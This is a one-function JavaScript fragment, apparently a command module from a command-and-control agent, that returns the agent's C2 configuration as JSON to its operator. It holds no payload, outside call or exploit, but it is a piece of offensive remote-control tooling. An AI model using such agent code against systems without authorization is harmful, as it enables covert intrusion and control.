exports.get_config = function(task, command, params){
    let config = C2.getConfig();
    return JSON.stringify({"user_output":config, "completed": true});
};
COMMAND_ENDS_HERE